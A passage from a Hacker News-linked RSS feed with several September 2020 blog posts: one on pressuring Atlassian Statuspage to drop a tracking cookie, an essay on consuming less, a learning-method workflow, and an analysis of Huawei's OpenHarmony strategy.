      <p><a href="https://nipunbatra.github.io/os2020/Zines/VIM.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1sot_LDAZBRTTdtZHbKBNJxWmJQ8B0RlQ/view?usp=sharing">[Video]</a>
    </p></div>
  </div>

  </article></div>]]>
            </description>
            <link>https://nipunbatra.github.io/os2020/zine/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24582973</guid>
            <pubDate>Thu, 24 Sep 2020 20:05:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[About Tracking Cookies on Status.healthchecks.io]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24582911">thread link</a>) | @todsacerdoti
<br/>
September 24, 2020 | https://blog.healthchecks.io/2020/09/about-tracking-cookies-on-status-healthchecks-io/ | <a href="https://web.archive.org/web/*/https://blog.healthchecks.io/2020/09/about-tracking-cookies-on-status-healthchecks-io/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-671" itemtype="https://schema.org/CreativeWork" itemscope="itemscope">
<div>

<div itemprop="text">
<p><a href="https://status.healthchecks.io/">status.healthchecks.io</a> used to set an ‚Äúajs_anonymous_id‚Äù tracking cookie. I‚Äôm happy to report that it does not do that anymore since September 22, 2020. In this post, I‚Äôll share the process I went through to get the tracking cookie removed.</p>
<p>For powering status.healthchecks.io, I am using a third-party hosted status page provider, Statuspage.io, by Atlassian. I initially set it up in May 2020 and <a href="https://blog.healthchecks.io/2020/05/healthchecks-io-status-page-facelift/">wrote about it on this blog</a>. After the setup, while poking around, I discovered my fancy new status page sets a tracking cookie. It does not ask for the user‚Äôs consent, and it does not obey the ‚ÄúDNT‚Äù header ‚Äì when you visit the page, you get a tracking cookie.&nbsp;</p>
<p>I believe this cookie was only used for innocuous purposes (tracking the number of unique page visitors), but it still invades site visitors‚Äô privacy and violates GDPR requirements. On May 7, I submitted a support ticket asking to remove the tracking cookie and got a reply with a bottom line: ‚ÄúWe can‚Äôt avoid setting these cookies.‚Äù After asking again, I got back a non-commital ‚ÄúI will forward this to our product team and development team,‚Äù and that was that.&nbsp;</p>
<p>I had already invested a significant amount of time setting up automation and custom metrics for the status page. And, aside from the cookie issue, I was generally happy with the product. Before switching providers over this one issue, I wanted to take a crack at fixing it. It was unlikely Atlassian would spend any engineering resources just because a single $29/mo customer had complaints. So I needed to bump up the priority of the issue. I searched around for other Statuspage.io customers and started contacting them. My email template went through several iterations until I got to a version that felt transparent and not manipulative:</p>

<blockquote><p>Subject: Cookies on status.somedomain.com<br>Hello,</p><p>when I visit status.somedomain.com I see it stores the following cookies in my browser:</p><p>* ajs_anonymous_id<br>* ajs_group_id</p><p>These are Atlassian‚Äôs tracking cookies. They are not essential, and so under GDPR they require the user‚Äôs explicit opt-in before they can be sent to the browser.</p><p>I am an Atlassian Statuspage customer myself, and my service‚Äôs status page has the exact same problem. I‚Äôve contacted Atlassian about this but this appears to be low priority for them.</p><p>I am contacting you because I think more affected customers being aware of the issue and asking Atlassian to fix it = higher chance that they will actually do something.</p><p>Thanks,<br>Pƒìteris Caune</p></blockquote>
<p>I started by manually sending ten or so emails out every week. I mostly got sympathetic and cooperative responses. There were some funny ones too. For example, one guy insisted that there is no problem because he could not reproduce the issue using ‚Äúinternal methods.‚Äù Me showing him the results of several different cookie scanning services (<a href="https://cookie-script.com/">cookie-script.com</a>, <a href="https://www.cookiebot.com/en/">cookiebot.com</a>) did not sway him.</p>
<p>I kept contacting other companies, and they sometimes forwarded me the responses they were getting from Atlassian. From these responses, it didn‚Äôt look like we were making much progress. In July, two months in, I decided to amp things up. I grabbed the <a href="https://majestic.com/reports/majestic-million">Majestic Million</a> dataset with the top million websites. I wrote a script that goes through the list, and, for each website, checks if it has an Atlassian-operated ‚Äústatus‚Äù subdomain. The script produced an HTML page with filtered results and ‚Äúmailto:‚Äù links, to help me send out the emails. Side note: did you know the ‚Äúmailto:‚Äù links <a href="https://developer.mozilla.org/en-US/docs/Learn/HTML/Introduction_to_HTML/Creating_hyperlinks#Specifying_details">can specify the message body</a>?</p>
<p>To find email addresses, I found the best way was to look at each website‚Äôs privacy policy and search for the ‚Äú@‚Äù symbol. I found typical contact addresses were <strong>privacy</strong>@somedomain.com and <strong>dpo</strong>@somedomain.com (where ‚Äúdpo‚Äù stands for Data Protection Officer). On July 26-27, one by one, I sent out emails to around 200 companies.</p>
<p>The wave of new support tickets from various companies worked. Atlassian started communicating back a plan to implement a cookie consent banner in Q1 2021. Later in August, they started saying ‚Äúlate September 2020‚Äù. I held off from sending more emails and waited to see what would happen in September.</p>
<p>On September 22, I received an update from Atlassian. Instead of implementing a cookie consent banner, they decided to drop the Page Analytics feature, which was responsible for the tracking cookie.&nbsp;From my point of view, this is the best possible outcome ‚Äì no tracking cookie and no consent banner. Statuspage.io still has an option of adding a Google Analytics tag. So, there still is&nbsp;<em>a way</em>&nbsp;to track the unique visits for those who need it.&nbsp;</p>
<p>Thank you, Atlassian / Statuspage.io, for implementing this change. I appreciate it! To my contact at Atlassian support, thank you for your patience.&nbsp;</p>
<p>To everyone who also contacted Atlassian about the tracking cookies, thank you! It took a team effort, but it worked out in the end!</p>
<p>‚Äì Pƒìteris</p>
</div>
</div>
</article></div>]]>
            </description>
            <link>https://blog.healthchecks.io/2020/09/about-tracking-cookies-on-status-healthchecks-io/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24582911</guid>
            <pubDate>Thu, 24 Sep 2020 19:59:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Consume less, produce more]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 8 (<a href="https://news.ycombinator.com/item?id=24582837">thread link</a>) | @hecticjeff
<br/>
September 24, 2020 | https://www.chrismytton.com/2020/09/24/consume-less-produce-more/ | <a href="https://web.archive.org/web/*/https://www.chrismytton.com/2020/09/24/consume-less-produce-more/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
<p>If you have too many inputs then your brain gets overwhelmed. Every piece of information you consume takes up some brain cycles.</p>

<p>If you‚Äôre not producing enough output to match your inputs then it can get clogged up in your brain. You end up with too many strands of thought. Too many lines of enquiry.</p>

<h2 id="excess-consumption-causes-anxiety">Excess consumption causes anxiety</h2>

<p>This can often be a cause of anxiety, stress and depression. Just increasing the amount you produce allows your brain to work through your anxieties.</p>

<p>Perhaps this is why mental health issues are on the rise. There are just so many inputs for our brain in the modern world that we don‚Äôt have time to process them all into coherent outputs, so that we can understand the information we‚Äôre being presented with.</p>

<h2 id="reduce-consumption">Reduce consumption</h2>

<p>Reduce the number of inputs in your daily life.</p>

<ul>
  <li>Stop reading the news</li>
  <li>Spend less time on social media</li>
  <li>Reduce the number of websites you visit daily</li>
  <li>Delete unused apps from your phone</li>
  <li>Eliminate unnecessary calendar appointments</li>
  <li>Spend less time watching TV series</li>
</ul>

<p>Generally stimulate your brain less.</p>

<h2 id="increase-production">Increase production</h2>

<p>Increase the number of productive outputs in your life.</p>

<ul>
  <li>Create something with your hands</li>
  <li>Draw or paint pictures (doesn‚Äôt matter if you‚Äôre good or not)</li>
  <li>Write more, keep a journal or a blog</li>
  <li>Increase your daily step count</li>
  <li>Explore new places</li>
  <li>Exercise regularly</li>
  <li>Cook for yourself, rather than eating out</li>
</ul>

<p>These are things that allow you to express yourself. Express the ideas in your brain. Work through the inputs in your life.</p>

<p>Not everything has to have a point, sometimes you just need to <a href="https://www.chrismytton.com/2019/09/24/do-things-for-fun/">do things for fun</a>.</p>

<p><img src="https://www.chrismytton.com/assets/images/chelt-paint-fest-2020.jpg" alt="Cheltenham Paint Festival 2020 at Cheltenham Spa station"></p>

<h2 id="express-yourself">Express yourself</h2>

<p>It‚Äôs by expressing the ideas in your brain that you can actually think clearly. Because the more you express them the more you can see them. Then you can visualise the ideas. Then you can better structure and organise them and compartmentalize them.</p>

<p>Now stop consuming these words and go and produce something. Express yourself.</p>

  </div></div>]]>
            </description>
            <link>https://www.chrismytton.com/2020/09/24/consume-less-produce-more/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24582837</guid>
            <pubDate>Thu, 24 Sep 2020 19:53:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to remember what you learn]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24582571">thread link</a>) | @flreln
<br/>
September 24, 2020 | https://vasilishynkarenka.com/learning/ | <a href="https://web.archive.org/web/*/https://vasilishynkarenka.com/learning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://vasilishynkarenka.com/content/images/size/w300/2020/09/IMG_1517.jpg 300w,
                            https://vasilishynkarenka.com/content/images/size/w600/2020/09/IMG_1517.jpg 600w,
                            https://vasilishynkarenka.com/content/images/size/w1000/2020/09/IMG_1517.jpg 1000w,
                            https://vasilishynkarenka.com/content/images/size/w2000/2020/09/IMG_1517.jpg 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://vasilishynkarenka.com/content/images/size/w2000/2020/09/IMG_1517.jpg" alt="How to remember what you learn">
            </figure>

            <section>
                <div>
                    <p><em>‚ÄúI don‚Äôt remember a damn thing.‚Äù</em></p><p>The book I hold my hands was full of highlights. It seemed like I‚Äôve got all colors of the rainbow on a page. Apparently, this didn‚Äôt help. When I tried recalling ideas from the book, I didn‚Äôt hear a thing. Just. Silence.</p><p>Terrified, I started questioning how much I <em>really</em> know. If I forget everything I read, I can‚Äôt apply my knowledge to the problem at hand. I can‚Äôt transfer it. And without transfer, knowledge is very much like music for deaf ears.</p><p>I quickly did the math. I was planning to invest in learning a few hours a day for the next ~75 years of my life. Staring at the number of potentially wasted hours, I knew exactly what I had to do.</p><hr><p>In the past six months, I‚Äôve devoured dozens of books, research papers, and studies on how people learn. As a result, I‚Äôve designed a learning process that works for me. It‚Äôs not perfect, but an order of magnitude better than what I had before. </p><p>In this work, I outline my workflow so that you can try it out. It applies to any subject or discipline, from programming to economics. If you stumble upon something where it doesn‚Äôt work, let me know.</p><blockquote><em>Make it time-based, take regular breaks, and learn what you‚Äôre curious about.</em></blockquote><p>The most important thing is that my learning is time-based, not goal-based. Setting learning goals such as ‚Äúread X pages today‚Äù is a way to fail because you set up the wrong incentives. When you plan to read X pages by lunch, you can‚Äôt help but begin optimizing for the goal, which leads to focusing on speed instead of understanding. And when you don‚Äôt have those ‚Äúaha‚Äù moments, it is hard to remember what you learn.</p><p>It‚Äôs also important to not overload yourself and take breaks. I do 3h learning sessions every day split into 30 min intervals with 5 min breaks. Breaks help to fall back into the diffuse mode of thinking and get access to a broader set of neural networks in my head. They also warm up my body, and I feel better after moving around for a few minutes.</p><p>As for material, I learn what I‚Äôm interested in. First, because life is <a href="http://www.paulgraham.com/vb.html">too short</a> to do things that you don‚Äôt love. Second, I‚Äôve found that studying stuff I genuinely like awakens my curiosity. And curiosity is essential to develop mastery because mastery is about depth and breadth of knowledge. </p><p>For example, if you‚Äôre learning JavaScript and you‚Äôre curious about it, you‚Äôll go and figure out how JS runtime environment works in Chrome even though the tutorial doesn‚Äôt cover it. Just because you‚Äôre interested. But if you‚Äôre not curious, then you‚Äôll just memorize the tutorial, and your knowledge will be shallow.</p><h2 id="how-my-learning-session-works">How my learning session works</h2><blockquote>Clean up working memory, apply metacognition, and "siege" the thing with questions to improve understanding.</blockquote><p>When I learn, I always have two devices on my desk. I have my laptop with the study material (ie, a book, a video, an article) on the right, and I have my iPad with a text editor open on the left.</p><p>This is how my current setup looks like:</p><figure><img src="https://vasilishynkarenka.com/content/images/2020/09/IMG_2658.jpg" alt="" srcset="https://vasilishynkarenka.com/content/images/size/w600/2020/09/IMG_2658.jpg 600w, https://vasilishynkarenka.com/content/images/size/w1000/2020/09/IMG_2658.jpg 1000w, https://vasilishynkarenka.com/content/images/size/w1600/2020/09/IMG_2658.jpg 1600w, https://vasilishynkarenka.com/content/images/size/w2400/2020/09/IMG_2658.jpg 2400w" sizes="(min-width: 720px) 720px"><figcaption>Morning learning session.</figcaption></figure><p>When I begin learning, I set a timer for 30 minutes and create three files in Drafts:</p><ol><li>A file with a timestamp where my random thoughts go.</li><li>A file with a timestamp where I think about the subject.</li><li>A file with questions.</li></ol><p><strong>The first file is a mind dump.</strong> When I start learning, I immediately begin thinking about things. It‚Äôs almost as if my brain wakes up and starts throwing ideas, tasks, and memories at me. I suspect this comes from the associative memory because I present myself with many triggers when I‚Äôm learning; words and sentences that bear special meaning to me and invoke these ideas.</p><p>But here‚Äôs the problem. If I don‚Äôt write thoughts down, I can‚Äôt focus. My working memory is overloaded with todos, ideas, and emotions. You‚Äôve probably experienced this for yourself ‚Äì your mind is running too fast, and you can‚Äôt really concentrate on what you‚Äôre learning. Having this ‚Äúdump‚Äù file is immensely useful to a) free up my working memory to focus on my learning instead of thinking about these things, and b) store these thoughts somewhere safe to go back to them later and take action.</p><p><strong>The second file is where I write about what I‚Äôm learning.</strong> Folks in the kitchen call it metacognition, which means thinking about thinking. Metacognition is the single best trick I‚Äôve found to improve understanding, and I will write more about it in the future. Whenever I don‚Äôt understand something or see that my understanding is shallow, I begin writing in the first person. It looks like this: ‚ÄúSo Peter explains that there are four characteristics of a monopoly, but I don‚Äôt really understand why branding is one of them; why so?‚Äù</p><p>It‚Äôs also important to note that I don‚Äôt write in a usual sentence-paragraph manner. Instead, I write every thought on a new line. I don‚Äôt even put dots at the end of the sentences. This helps me to focus on understanding instead of nitty-gritty styling and typos. The ‚Äúenter‚Äù key on a keyboard serves as the ‚Äúend of thought‚Äù symbol and helps formulate ideas more clearly.</p><p>Another important idea is that my editor is plain text. I‚Äôve found it incredibly liberating to operate in a plain text environment where you don‚Äôt have incentives to color, underline, bold, italicize, or do some other weird things with the text you‚Äôre writing. Instead of choosing the right font for my heading, I can focus on meaning instead. Also, my plain text app is way faster than all feature-rich text editors, and I‚Äôve found it essential for a thought input environment to be fast. Otherwise, I can't think.</p><p>Here‚Äôs a fragment from my learning of React yesterday:</p><figure><img src="https://vasilishynkarenka.com/content/images/2020/09/IMG_D7F6BD12F133-1.jpeg" alt="" srcset="https://vasilishynkarenka.com/content/images/size/w600/2020/09/IMG_D7F6BD12F133-1.jpeg 600w, https://vasilishynkarenka.com/content/images/size/w1000/2020/09/IMG_D7F6BD12F133-1.jpeg 1000w, https://vasilishynkarenka.com/content/images/size/w1600/2020/09/IMG_D7F6BD12F133-1.jpeg 1600w, https://vasilishynkarenka.com/content/images/size/w2400/2020/09/IMG_D7F6BD12F133-1.jpeg 2400w" sizes="(min-width: 720px) 720px"><figcaption>Metacognition notes from studying React.js.</figcaption></figure><p>You‚Äôre probably thinking that it‚Äôs quite a bit of writing. It is. For an hour-long learning session, I usually do about 500-1000 words in this file. But it‚Äôs worth every character, and here‚Äôs why:</p><ul><li>When I apply metacognition, I understand things <em>way</em> better than when I don‚Äôt. I‚Äôve tested many different learning modes and found metacognition to perform at least 2x better based on my later ability to recall and transfer knowledge. Also, there‚Äôs <a href="https://academicpublishingplatforms.com/downloads/pdfs/ati/volume18/201607070302_09_ATI_Vol11_Issue2_2015_Todorova_and_Karamanska_Study_motivation_satisfaction_students_e-learning_pp.82-89.pdf">some</a> <a href="http://www.csun.edu/science/ref/reasoning/how-students-learn/1.html">research</a> on metacognition as well.</li><li>Having a file with my thinking about the subject keeps my working memory clean. I don‚Äôt feel overloaded as I usually feel after reading many articles at one go. You‚Äôve probably experienced this yourself; your brain is almost melting after an hour of scrolling through the web. That‚Äôs because you present yourself with too much information without really making sense of it. After a few months of applying metacognitive practices, I realized that I can‚Äôt go back. It just feels so strange to experience that cognitive load again.</li><li>Metacognition improves remembering through elaboration and interleaving. When I‚Äôm writing my thoughts in the file, I can‚Äôt help but begin connecting them with other ideas on that topic because of associative memory. And interleaving leads to mastery.</li><li>(Speculation) Training metacognition improves my ability to transform vague notions and thoughts that I have during the day into specific words that I can write down for later analysis. This one is particularly interesting to me, but there‚Äôs no evidence besides my own experiments. And I might be biased because I‚Äôve come up with this method.</li></ul><p>Moreover, I type 2-3x faster than most people because I use <a href="https://barehands.substack.com/p/how-to-type-3x-faster">shortcuts</a>. So it‚Äôs not that bad.</p><p><strong>The third file is questions. </strong>Whenever I stumble upon something that I don‚Äôt understand, I try to break it down into a set of simple questions. Each question in the group takes on a small part of the problem. If the concept is particularly challenging, I try to ‚Äúsiege‚Äù it with questions from many many different angles and break it down even further.</p><p>When I‚Äôm beginning a new session, I always start from the previous one‚Äôs questions file. I only look at questions and answer them before I‚Äôm beginning new learning. This doesn‚Äôt sound like very much fun, but it‚Äôs actually pretty interesting to explain stuff to yourself if you do it out loud. Answering questions improves my understanding and helps to connect ideas together. And yes, answering questions counts as learning ‚Äì probably the most efficient learning you could be doing.</p><p><em>I'm not going into much detail on questions because Michael Nielsen has done a phenomenal job describing it <a href="http://augmentingcognition.com/ltm.html">here</a>.</em></p><h2 id="what-happens-after-the-session">What happens after the session</h2><blockquote>Write a dense summary, provoke elaboration, interleaving, and transfer, and choose what to never forget.</blockquote><p>After the session is done, and my three files are full of information, I begin the recap process.</p><p><strong>First, I write a three to five sentence-long summary of what I‚Äôve just studied.</strong> Here I try to distill the material‚Äôs core idea and compress the whole thing into a maximally dense chunk. When I‚Äôm summarizing, my laptop is closed. Not looking at the text helps to ‚Äúcompress‚Äù the idea to its core and make a small ‚Äúhook‚Äù to my memory to later see what the whole book was about.</p><p>Here‚Äôs how my summary note looks like: </p><figure><img src="https://vasilishynkarenka.com/content/images/2020/09/IMG_9771D059CFD1-1.jpeg" alt="Recap of studying React.js." srcset="https://vasilishynkarenka.com/content/images/size/w600/2020/09/IMG_9771D059CFD1-1.jpeg 600w, https://vasilishynkarenka.com/content/images/size/w1000/2020/09/IMG_9771D059CFD1-1.jpeg 1000w, https://vasilishynkarenka.com/content/images/size/w1600/2020/09/IMG_9771D059CFD1-1.jpeg 1600w, https://vasilishynkarenka.com/content/images/size/w2400/2020/09/IMG_9771D059CFD1-1.jpeg 2400w" sizes="(min-width: 720px) 720px"><figcaption>Recap of studying React.js.</figcaption></figure><p>Very often, what I‚Äôm writing in the summary section is not what the text was about, but what it means to me. In other words, if both of us read this text and wrote a summary of it, mine would be very different than yours.</p><p>After I‚Äôm done with the summary, I write down the answers to three questions:</p><ol><li>What are the key ideas? </li><li>How can I apply this knowledge that I learned? </li><li>How do these ideas relate to what I already know?</li></ol><p><strong>The first question speaks for itself.</strong> I try to remember what I just read and write down as many ideas as I can bring back. When I began applying the metacognition trick that I mentioned earlier, I noticed a 3x increase in the number of concepts I could recall. And as I speculate that long-term memory recall is influenced by initial interleaving and recall, this might actually help to improve your long-term memory.</p><p><strong>The second question is about transfer.</strong> The sole purpose of learning is to apply the knowledge that we learn. Without application, ‚Ä¶</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vasilishynkarenka.com/learning/">https://vasilishynkarenka.com/learning/</a></em></p>]]>
            </description>
            <link>https://vasilishynkarenka.com/learning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24582571</guid>
            <pubDate>Thu, 24 Sep 2020 19:31:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[300 Years: Huawei's Open Source Strategy]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24582314">thread link</a>) | @ceohockey60
<br/>
September 24, 2020 | https://interconnected.blog/300-years-huawei-open-source-strategy/ | <a href="https://web.archive.org/web/*/https://interconnected.blog/300-years-huawei-open-source-strategy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="english-version">
                        <p>Lost in the fog of TikTok was an important announcement: Huawei open sourced its homemade mobile operating system, HarmonyOS, now dubbed OpenHarmony. This announcement flew under the radar, but has far-reaching implications to not just the future of mobile technology, but also how that landscape will influence the geopolitical chess match between the U.S. and China.</p><p>But like many things that come out of China, it‚Äôs less a game of chess, but more a game of <a href="https://en.wikipedia.org/wiki/Go_(game)">Go</a>. </p><figure><img src="https://interconnected.blog/content/images/2020/09/huawei-oss-strategy_small-2.jpg" alt="" srcset="https://interconnected.blog/content/images/size/w600/2020/09/huawei-oss-strategy_small-2.jpg 600w, https://interconnected.blog/content/images/size/w1000/2020/09/huawei-oss-strategy_small-2.jpg 1000w, https://interconnected.blog/content/images/2020/09/huawei-oss-strategy_small-2.jpg 1568w" sizes="(min-width: 720px) 720px"></figure><h2 id="openharmony-the-technology">OpenHarmony: the Technology</h2><p>Let‚Äôs first get a handle on the technology that underpins OpenHarmony. Because the project started, first in 2012 and intensified in 2019, as a strategic initiative to reduce Huawei‚Äôs reliance on the Android operating system due to U.S. sanctions, many <a href="https://www.forbes.com/sites/davidphelan/2020/08/28/what-is-huaweis-smartphone-operating-system--should-i-buy-into-it/#4ca0a8311fd7">mistakenly believe</a> it is based on either Android or Linux (of which Android is based). <strong>That‚Äôs not true.</strong></p><p>OpenHarmony is based on another open source operating system called <a href="https://en.wikipedia.org/wiki/FreeBSD">FreeBSD</a>. Interestingly, Apple‚Äôs macOS and iOS also leveraged FreeBSD indirectly from another operating system project called Darwin. So, on a bits and bytes level, Huawei‚Äôs OpenHarmony is more similar to iOS than Android.</p><p>This is a smart decision because if the whole point is to reduce reliance on Android, the most important thing to avoid is co-mingling code with either Android or Linux in case it triggers obscure licensing restrictions. And the last thing a development team wants is to have technology licensing lawyers checking every line of code the engineers write, especially when they need to develop quickly to avoid an existential crisis, which is what Huawei has right now.</p><p>Because the project is open sourced, there‚Äôs a lot one can do now to evaluate and verify OpenHarmony. In fact, I verified the <a href="https://openharmony.gitee.com/openharmony/kernel_liteos_a/blob/master/bsd/arm/autoconf.c">FreeBSD lineage by rummaging through</a> its codebase, which is all hosted on Gitee. For readers who had a chance to read my previous post ‚Äú<a href="https://interconnected.blog/can-you-nationalize-open-source/"><strong>Can You ‚ÄòNationalize‚Äô Open Source?</strong></a>‚Äù, Gitee should sound familiar. It is a Git-based developer collaboration application that was recently anointed by the Ministry of Industry and Information Technology (MIIT) as the domestic ‚Äúnational champion‚Äù to drive open source growth in China. <strong>What I didn‚Äôt know when I wrote the previous post was that Huawei also became a strategic investor in Gitee in early September via </strong><a href="https://media.qimingpian.cn/qmp/b131b66d760b6b900485a1e30c2762f5.html"><strong>its corporate venture arm, Habo</strong></a><strong>.</strong></p><p>But as every open source technologist can attest, no project ever gets traction without a long period of steadfast community-building and credibility-building. That‚Äôs where the OpenAtom Foundation comes in.</p><h2 id="openatom-the-foundation">OpenAtom: the Foundation</h2><p>The OpenAtom Foundation is China‚Äôs first non-profit organization of its kind geared towards fostering open source technologies, much in the same way as the Linux Foundation or the Apache Software Foundation. <strong>Huawei drove the founding of this foundation, and OpenHarmony is its anchor project.</strong></p><p>But what is the point of a foundation anyway? As I‚Äôve written in ‚Äú<a href="https://interconnected.blog/covid-open-source-industrial-policy/"><strong>COVID, Open Source, Industrial Policy</strong></a>‚Äù, a foundation‚Äôs involvement can help open source technologies in two meaningful ways: <strong>accelerate development and vendor neutrality.</strong> In a nutshell, vendor neutrality is important because it allows other large companies to contribute in the development of an open source technology without fearing vendor lock-in by another company, thus leads to faster development of that technology. An example would be Kuberentes, an open source container orchestration software that was first created by Google but is now the anchor project for the <a href="https://www.cncf.io/">Cloud Native Computing Foundation</a> (CNCF); Kubernetes‚Äôs <a href="https://www.zdnet.com/article/kubernetes-and-containers-are-growing-up-fast-survey-shows/">fast growth</a> would not be possible if it still resides within Google.</p><p>While a foundation‚Äôs involvement is by no means necessary -- and many open source projects have become popular without a foundation‚Äôs support -- it does help. <strong>And that‚Äôs what the OpenAtom Foundation is trying to deliver for China‚Äôs technology ecosystem. </strong>Its model and value proposition is similar to that of the Linux Foundation: basically <strong>delivering foundation (thus neutrality) as a service</strong> to open source projects, including legal, IP trademark management, licensing, community building, joint marketing, etc.</p><p>An open source foundation is successful when it builds an ecosystem of technologies around the anchor project with a coherent theme. The Linux Foundation, of course, built an ecosystem around Linux with many ancillary and adjacent technologies around the ‚Äúopen source operating system‚Äù theme. &nbsp;The CNCF (a subsidiary foundation of the Linux Foundation) <a href="https://github.com/cncf/landscape/blob/master/README.md#trail-map">built an ecosystem</a> of technologies around Kubernetes and the ‚Äúcloud-native‚Äù theme.</p><p>While the OpenAtom Foundation is <a href="https://www.openatom.org/#/projectList">already hosting seven projects</a> as part of its launch, with a lofty goal of fostering open source software, hardware, semiconductors, and content (I‚Äôm assuming documentation and technical education), the only theme seems to be that all projects were created by Chinese companies. And besides OpenHarmony, whose strategic value to Huawei is clear, the other technologies seem trivial to their original creators:</p><ul><li><strong>Xuperchain</strong>, a blockchain infrastructure project from <strong>Baidu</strong></li><li><strong>TKEStack</strong> (a container orchestration layer based on Kubernetes) and <strong>TencentOS</strong> (an energy-efficient IoT operating system) from <strong>Tencent</strong></li><li><strong>AliOS</strong> (a light-weight IoT operating system) from <strong>Alibaba</strong></li><li><strong>PIKA</strong> (a storage system based on the open source database, Redis) from <strong>Qihoo360</strong></li><li><strong>UBML</strong> (a Unified Business Modeling Language modeling system) from <strong>Netease</strong><br></li></ul><figure><img src="https://lh4.googleusercontent.com/73XjJgCZnhJYxnCW4L8XjLFa9FHQbxAz7nYWTWmaGAsUVSW-L7TH7BurSGCj-H1sc2PnemuL2tuzm16EM7vxtBs8ydPAhQSHCHnsMidVpguJhBaU6hVavLasls45i76RPVNyGFbZ" alt=""></figure><p>If I have to surmise a future theme that is technology-focused and not nationality-focused, it would be IoT because when OpenHarmony was first unveiled in 2019 (as HarmonyOS), it was an IoT-focused operating system, like TencentOS and AliOS. But since then, its scope has broadened to include support for smartphones, watches, and smart TVs.</p><p>One other curious element about OpenAtom is that <strong>only two projects</strong> (OpenHarmony, TencentOS) are hosted on the ‚Äúnational champion‚Äù, <strong>Gitee</strong>, while <strong>four others</strong> (AliOS, PIKA, Xuperchain, TKE) are on <strong>GitHub</strong>. The remaining one, UBML from Netease, requires a developer to fill out a form to apply for access, which is a very developer-<em><strong>un</strong></em>friendly way to run an open source project.</p><h2 id="technology-foundation-developer-approval">Technology + Foundation = Developer Approval?</h2><p>That‚Äôs the hope anyway. The nirvana of an open source technology, with or without a foundation, is to achieve widespread participation and buy-in among developers, who will both make use of the technology at scale and contribute to its development. And if an <em>experienced</em> foundation gets involved to leverage its best practices in open source management, it can increase the success rate by reducing much of the messiness and common mistakes that often plague young open source projects.</p><p>In the case of Huawei though, <strong>OpenHarmony is a young project, and OpenAtom is an even younger foundation.</strong></p><p>The lazy and obvious conclusion here is to just dismiss all these efforts as a fool‚Äôs errand. <strong>But that‚Äôs not what you came to Interconnected for. </strong>The honest and nuanced conclusion is: <strong>it‚Äôs too early to tell and there are trends working both against and for Huawei‚Äôs open source strategy.</strong></p><h3 id="factors-against">Factors Against</h3><p>Huawei is infamous for its secretive ownership structure. Nobody knows exactly who or what owns Huawei. It‚Äôs a private Chinese LLC. It‚Äôs employee-owned, with 98.99% of company shares controlled by its employees via a ‚Äútrade union committee‚Äù. Allegedly, this committee pays dues to more senior trade unions in an opaque bureaucracy that ultimately leads to the All-China Federation of Trade Unions, which is controlled by the Chinese Communist Party (thus all the controversy). That‚Äôs why <a href="https://interconnected.blog/why-huawei-should-ipo-in-america/">I‚Äôve advocated for Huawei to IPO in New York</a> -- a bold act that would bring some desperately-needed credibility to the company.</p><p>Along the same vein, the OpenAtom Foundation also needs transparent, credible governance of its projects <em>and itself</em>. It currently boasts a 16-member Technical Oversight Committee (TOC), a typical governing element of an open source foundation, with Chinese technologists who have had years of experience working on projects in the Apache Software Foundation and Mozilla Foundation -- a good start. Their decision making process will have to be public and transparent to earn credibility from the wide developer community, both within and outside of China. As a reference, the <a href="https://github.com/cncf/toc/">CNCF TOC‚Äôs every governing deliberation</a> is viewable and commentable on GitHub. Because OpenAtom is, after all, a China-registered entity, to what degree it can deliver pure transparency is questionable.</p><p>Lastly, OpenHarmony‚Äôs birthright as a Chinese creation makes building neutrality and credibility harder than just about any other birthright on the planet. <strong>This is an obvious yet important point that every Chinese company is struggling with right now. It is an element that every Chinese immigrant living abroad has been struggling with for much longer. </strong>For a young project, OpenHarmony does have reasonably good documentation in both English and Chinese -- an important first step that must be continued for the long haul. Maintaining a bilingual presence (much like this blog) requires lots of extra hard work -- work that an American-born, German-born, or French-born project does not have to do. <strong>None of us can pick where we are born, but we all have to deal with its uneven consequences. There is no point in pretending that doesn‚Äôt exist.</strong></p><h3 id="factors-for">Factors For</h3><p>It‚Äôs not all doom and gloom for Huawei; there are a couple of factors potentially working in its favor. For one, the U.S.‚Äôs own credibility and neutrality when regulating cross-border technology businesses is also deteriorating. The Trump administration‚Äôs wheeling and dealing of TikTok is nothing short of cronyism, so much so that it has been called out by <a href="https://www.wsj.com/articles/trump-tiktok-and-crony-capitalism-11600639766?mod=hp_opin_pos_2">none other than the WSJ editorial board</a>. Although this doesn‚Äôt mean Huawei will have an opening to re-enter the U.S. market, other parts of the world may be more receptive to its technology. Regions like Southeast Asia, Latin America, the Middle East, and Africa are all credible possibilities. (See more in ‚Äú<a href="https://interconnected.blog/where-can-the-chinese-internet-go/"><strong>Where Can the Chinese ‚Ä¶</strong></a></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://interconnected.blog/300-years-huawei-open-source-strategy/">https://interconnected.blog/300-years-huawei-open-source-strategy/</a></em></p>]]>
            </description>
            <link>https://interconnected.blog/300-years-huawei-open-source-strategy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24582314</guid>
